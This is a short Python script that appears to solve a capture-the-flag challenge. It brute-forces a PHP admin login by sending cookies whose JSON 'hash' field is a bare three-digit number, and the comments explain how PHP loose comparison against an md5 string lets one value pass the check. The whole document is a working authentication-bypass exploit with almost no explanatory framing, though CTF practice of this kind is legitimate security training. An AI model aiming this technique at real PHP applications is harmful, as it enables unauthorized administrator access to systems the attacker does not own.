import requests

def breakphp():
    url = "https://gameserver.zajebistyc.tf/admin/login.php?"
    default = 'I CAN EVEN GIVE YOU A HINT XD \n0006464640640064000646464640006400640640646400\n'

    # First three chars are numbers, then text
    # If our json payload is a number that matches the first three digits of md5
    # The != condition will be bypassed

    nums = "0123456789"
    
    # The regex is '/^{"hash": [0-9A-Z\"]+}$/'
    # Therefore we can send a number in the json payload, need not be string
    
    for i in nums[1:]: # json doesn't decode if the first digit is 0
        for j in nums:
            for k in nums:
                val = i + j + k
                print("Trying: {}".format(i+j+k))
                cookie = {"otadmin" : '{"hash": ' + val + '}'}
                res = requests.get(url, cookies=cookie).text
                if res != default:
                    print(cookie)
                    print(res)
                    return

breakphp()